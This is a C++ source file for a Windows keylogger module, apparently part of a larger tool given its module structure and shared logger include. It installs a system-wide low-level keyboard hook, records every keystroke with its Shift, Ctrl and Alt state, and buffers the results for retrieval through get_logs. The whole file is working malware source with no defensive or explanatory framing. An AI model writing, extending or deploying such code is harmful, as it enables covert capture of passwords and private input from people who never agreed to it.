#include "keylogger.h"
#include "../utils/logger.h"
#include <sstream>
#include <iostream>

static KeyloggerModule* g_keylogger_instance = nullptr;

KeyloggerModule::KeyloggerModule() : running(false), keyboard_hook(NULL) {
    g_keylogger_instance = this;
}

KeyloggerModule::~KeyloggerModule() {
    stop();
}

LRESULT CALLBACK KeyloggerModule::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && g_keylogger_instance) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            bool shift = GetAsyncKeyState(VK_SHIFT) & 0x8000;
            bool ctrl = GetAsyncKeyState(VK_CONTROL) & 0x8000;
            bool alt = GetAsyncKeyState(VK_MENU) & 0x8000;
            g_keylogger_instance->log_key(p->vkCode, shift, ctrl, alt);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

bool KeyloggerModule::start() {
    if (running) return false;
    keyboard_hook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    if (keyboard_hook) {
        running = true;
        Logger::getInstance().log("Keylogger started.");
        return true;
    }
    return false;
}

void KeyloggerModule::stop() {
    if (keyboard_hook) {
        UnhookWindowsHookEx(keyboard_hook);
        keyboard_hook = NULL;
    }
    running = false;
    Logger::getInstance().log("Keylogger stopped.");
}

void KeyloggerModule::log_key(int key, bool shift, bool ctrl, bool alt) {
    std::stringstream ss;
    if (ctrl) ss << "[CTRL+]";
    if (alt) ss << "[ALT+]";
    if (shift) ss << "[SHIFT+]";
    
    if (key >= 'A' && key <= 'Z') {
        ss << (char)(shift ? key : key + 32);
    } else if (key >= '0' && key <= '9') {
        ss << (char)key;
    } else {
        switch(key) {
            case VK_SPACE: ss << " "; break;
            case VK_RETURN: ss << "[ENTER]\n"; break;
            case VK_TAB: ss << "[TAB]"; break;
            case VK_BACK: ss << "[BACKSPACE]"; break;
            case VK_ESCAPE: ss << "[ESC]"; break;
            default: ss << "[0x" << std::hex << key << "]";
        }
    }
    logs.push_back(ss.str());
    if (logs.size() > 1000) {
        logs.erase(logs.begin());
    }
}

std::string KeyloggerModule::get_logs() {
    std::string result;
    for (const auto& log : logs) {
        result += log;
    }
    return result;
}

void KeyloggerModule::clear_logs() {
    logs.clear();
}
